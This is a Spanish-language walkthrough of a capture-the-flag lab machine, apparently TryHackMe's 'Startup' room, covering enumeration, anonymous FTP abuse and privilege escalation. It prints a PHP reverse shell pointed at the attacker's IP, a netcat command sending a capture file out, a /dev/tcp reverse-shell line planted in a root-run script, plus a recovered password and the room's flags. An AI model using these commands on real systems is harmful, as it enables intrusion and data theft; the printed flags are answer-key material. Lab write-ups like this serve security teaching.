## Objetivo
## Pistas
## Solución

Primero nos conectamos a la vpn

sudo openvpn ZeroOne1233.ovpn

1.**What is the secret spicy soup recipe?**
Comenzaremos con un escaneo de nmap. Queremos que el escaneo enumere los servicios y sea muy detallado, por lo que usaremos los indicadores sV y vv. El siguiente será el comando que usaremos:

nmap -sV -vv 10.10.129.12

Encontramos tres puertos abiertos: FTP, SSH y HTTP.

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

Dado que el FTP está abierto, es posible que podamos conectarnos de forma anónima. Probemos esto con el siguiente comando:

ftp anonymous@10.10.129.12

```
──(kali㉿kali)-[~]
└─$ ftp anonymous@10.10.129.12
Connected to 10.10.129.12.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

El servicio permite el acceso anónimo, ahora podemos listar cualquier archivo aquí usando el siguiente comando

ls -al

Hay tres archivos y un directorio. El directorio ftp tiene permisos completos, lo que puede ser importante más adelante, pero por ahora descarguemos los archivos con el siguiente comando:
```
get mget * para descargar todo o
get nombredel archivo
```

El archivo .test.log no contiene nada importante. El mensaje notice.txt contiene un mensaje sobre personas que publican memes en el sitio compartido. Mencionan el nombre Maya, que puede ser un posible nombre de usuario más adelante.

Pasé la imagen por Aperisolve para buscar algo en ella, pero no encontré nada inmediatamente. Cambiemos al directorio ftp y veamos si hay algo dentro.

No hay nada dentro. Hemos comprobado todo aquí y no podemos hacer mucho con SSH ahora, así que comencemos a comprobar el puerto HTTP. Comenzaremos con la página de inicio del sitio web.

No hay nada en la página de inicio y el código fuente contiene un solo comentario que pregunta cuándo actualizarán el sitio web. Usemos Gobuster para buscar directorios ocultos. Usaremos el siguiente comando para realizar el escaneo con la lista de palabras common.txt:

```
gobuster dir -u http://10.10.129.12 -w /usr/share/wordlists/dirb/common.txt

```

```
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/files                (Status: 301) [Size: 312] [--> http://10.10.129.12/files/]
/index.html           (Status: 200) [Size: 808]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

El directorio /files es el servicio FTP. Se puede acceder a todo lo que se encuentra en el servicio FTP desde el navegador. Podemos usarlo para obtener acceso a la máquina cargando un shell en el servicio FTP y ejecutándolo en nuestro navegador. Anteriormente, descubrimos que el directorio ftp tenía permisos completos para todos, por lo que cargaremos nuestro shell allí.

Usaremos PHP Reverse Shell de PentestMonkey y reemplazaremos la IP y el puerto con los nuestros.

Ya kali viene con uno:
```

──(kali㉿kali)-[~/Documents/Seguridad de redes/Startup]
└─$ locate php-reverse
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php

Nomas copiamos

──(kali㉿kali)-[~/Documents/Seguridad de redes/Startup]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php

Ahora lo editamos

set_time_limit (0);
$VERSION = "1.0";  
$ip = '10.9.0.72';  // CHANGE THIS es la ip de nuestra maquina
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


Ahora lo subimos

ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||47874|)
553 Could not create file.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||6324|)
553 Could not create file.
ftp> mkdir test
550 Create directory operation failed.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||9042|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> mkdir test
257 "/ftp/test" created
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||53518|)
150 Ok to send data.
100% |**************************************|  5491       26.31 MiB/s    00:00 ETA
226 Transfer complete.
5491 bytes sent in 00:00 (13.20 KiB/s)
ftp> 

```

Ahora necesitamos algo que detecte el shell cuando lo ejecutamos. Iniciaremos un receptor netcat con el siguiente comando:

```
─(kali㉿kali)-[~/Documents/Seguridad de redes/Startup]
└─$ rlwrap nc -lnvp 1234           
listening on [any] 1234 ...

Ahora hacemos click enn el shell en el la pagina web


Ahora buscamos

$ whoami
www-data
$ ls
bin
boot
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ ls -la
total 100
drwxr-xr-x  25 root     root      4096 Oct  9 02:22 .
drwxr-xr-x  25 root     root      4096 Oct  9 02:22 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Oct  9 02:22 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 113 root     root         0 Oct  9 02:22 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       900 Oct  9 03:22 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Oct  9 02:22 sys
drwxrwxrwt   7 root     root      4096 Oct  9 03:34 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
$ 

Hay un archivo llamado “recipe.txt”, podemos listar el contenido del archivo usando “cat”.

$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
$ 


```

**2. What are the contents of user.txt?**

Antes de poder obtener la bandera de usuario, necesitamos saber quiénes son los usuarios del sistema. Podemos cambiar nuestro directorio actual a /home y enumerar los directorios para hacer esto.

```
  cd /home
$ ls
lennie
$ 

```

No podemos acceder al directorio de Lennie, por lo que debemos encontrar una forma de acceder a su cuenta. Cuando enumeramos los archivos anteriormente, había un directorio llamado "incidentes". Veamos qué hay allí.

```
$ cd /incidents
$ ls
suspicious.pcapng
$ 

suspicious.pcapng
$ nc 10.9.0.72 3333 < suspicious.pcapng


/////////

└─$ nc -lnvp 3333 > suspicious.pcapng

listening on [any] 3333 ...
connect to [10.9.0.72] from (UNKNOWN) [10.10.129.12] 57376

```

Este archivo puede contener algo que necesitamos, para comprobarlo en Wireshark. Para ello, utilizaremos el siguiente comando:

```

──(kali㉿kali)-[~/Documents/Seguridad de redes/Startup]
└─$ wireshark suspicious.pcapng 


```

Si hacemos clic derecho en un paquete y seleccionamos Follow>TCP Stream, podemos ver que se realizan algunas acciones en la máquina de destino en los flujos dos y siete. En el flujo siete, podemos ver que se ingresan comandos sudo como www-data y que se ingresa una contraseña incorrecta. Probemos esta contraseña para Lennie.

c4ntg3t3n0ughsp1c3

```
ssh lennie@10.10.72.219
```

Ya adentro

```
$ ls
Documents  scripts  user.txt
$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
$ 

```

**3. What are the contents of root.txt?**

Cuando enumeramos el contenido del directorio de Lennie, vimos dos directorios además de la bandera: Documentos y scripts. Hay tres archivos de texto en el directorio Documentos, veamos qué hay en ellos.
There’s nothing really here, let’s see the scripts.

Hay un archivo de texto llamado “startup list.txt”,y planner enumeraremos el contenido.

No hay nada, lo cual no nos ayuda en absoluto. Revisar el archivo planner.sh nos da algo que puede resultar útil.

```
$ ls -la
total 24
drwx------ 5 lennie lennie 4096 Oct  9 03:58 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwx------ 2 lennie lennie 4096 Oct  9 03:58 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
$ cd scripts
$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Oct  9 03:58 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Oct  9 04:05 startup_list.txt
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
$ 

```

Ocupamos un revers shell 
podemos usar este
https://www.revshells.com/
Ponemos el ip de nuestra maquina y el puerto que decidimos usar

y despues lo usamos 
```
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
$ echo "sh -i >& /dev/tcp/10.9.0.72/5555 0>&1" > /etc/print.sh
$ cat /etc/print.sh
sh -i >& /dev/tcp/10.9.0.72/5555 0>&1
$     


```

Y listo en la otra terminal esta 
```

┌──(kali㉿kali)-[~/Documents/Seguridad de redes/Startup]
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.9.0.72] from (UNKNOWN) [10.10.129.12] 52996
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/root
# ls
root.txt
# cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
# 


```
## Notas adicionales
## Referencias